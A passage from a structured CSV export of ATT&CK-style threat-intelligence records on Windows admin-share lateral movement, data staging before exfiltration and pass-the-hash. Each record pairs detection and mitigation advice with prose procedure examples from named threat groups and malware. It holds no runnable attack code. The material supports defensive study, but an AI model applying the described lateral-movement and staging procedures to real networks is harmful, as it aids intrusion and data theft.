10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1309,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0032|Lazarus Group]] malware SierraAlfa accesses the <code>ADMIN$</code> share via SMB to conduct lateral movement.[[CiteRef::Novetta Blockbuster RATs]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],[],['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1310,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1311,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1312,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1313,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0147|Pteranodon]] creates various subdirectories under <code>%Temp%\\reports\\%</code> and copies files to those subdirectories. It also creates a folder at <code>C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store</code> to store screenshot JPEG files.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Pteranodon,['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1314,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""[[Software/S0128|BADNEWS]] copies documents under 15MB found on the victim system to is the user's <code>%temp%\\SMB\\</code> folder.[[CiteRef::Forcepoint Monsoon]]""]",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: BADNEWS,['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1315,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0045|ADVSTORESHELL]] stores output from command execution in a .dat file in the %TEMP% directory.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1316,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0136|USBStealer]] collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.[[CiteRef::ESET Sednit USBStealer 2014]][[CiteRef::Kaspersky Sofacy]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1317,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0007|APT28]] has stored captured credential information in a file named pi.log.[[CiteRef::Microsoft SIR Vol 19]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1318,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""[[Software/S0035|SPACESHIP]] identifies files with certain extensions and copies them to a directory in the user's profile.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SPACESHIP,['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1319,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Software/S0036|FLASHFLOOD]] stages data it copies from the local system or removable drives in the ""%WINDIR%\\$NtUninstallKB885884$\\"" directory.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: FLASHFLOOD,['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1320,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0094|Trojan.Karagany]] can create a directory (<code>C:\\ProgramData\\Mail\\MailAg\\gl</code>) to use as a temporary directory for uploading files.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Trojan.Karagany,['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1321,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['TRINITY malware used by [[Group/G0037|FIN6]] identifies payment card track data on the victim and then copies it to a local file in a subdirectory of <code>C:\\Windows\\</code>. Once the malware collects the data, [[Group/G0037|FIN6]] actors compressed data and moved it to another staging system before exfiltration.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1322,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Group/G0032|Lazarus Group]] malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.[[CiteRef::Novetta Blockbuster Loaders]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1323,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Group/G0045|menuPass]] stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.[[CiteRef::PWC Cloud Hopper April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1324,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Group/G0027|Threat Group-3390]] actors saved RAR files for exfiltration in the Recycler directory. They have also staged RAR files, renamed with a .zip file extension, on externally accessible Web servers and then issued HTTP GET requests to exfiltrate the files from the victim network.[[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1325,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0027|Threat Group-3390]] has staged encrypted archives for exfiltration on Internet-facing servers that had previously been compromised with [[Software/S0020|China Chopper]].[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1074'],['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1326,['Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.'],[],[],[],['Authentication logs'],['[[Software/S0122|Pass-The-Hash Toolkit]] can perform pass the hash.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"[""Monitor systems and domain logs for unusual credential logon activity. Prevent access to [[Technique/T1078|Valid Accounts]]. Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform [[Lateral Movement]] between systems. Ensure that built-in and created local administrator accounts have complex, unique passwords. Do not allow a domain user to be in the local administrator group on multiple systems.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires Microsoft Windows as target system'],Software: Pass-The-Hash Toolkit,['Lateral Movement'],['Technique/T1075'],['Pass the Hash'],https://attack.mitre.org/wiki/Technique/T1075
1327,['Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.'],[],[],[],['Authentication logs'],['The [[Group/G0006|APT1]] group is known to have used pass the hash.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"[""Monitor systems and domain logs for unusual credential logon activity. Prevent access to [[Technique/T1078|Valid Accounts]]. Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform [[Lateral Movement]] between systems. Ensure that built-in and created local administrator accounts have complex, unique passwords. Do not allow a domain user to be in the local administrator group on multiple systems.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires 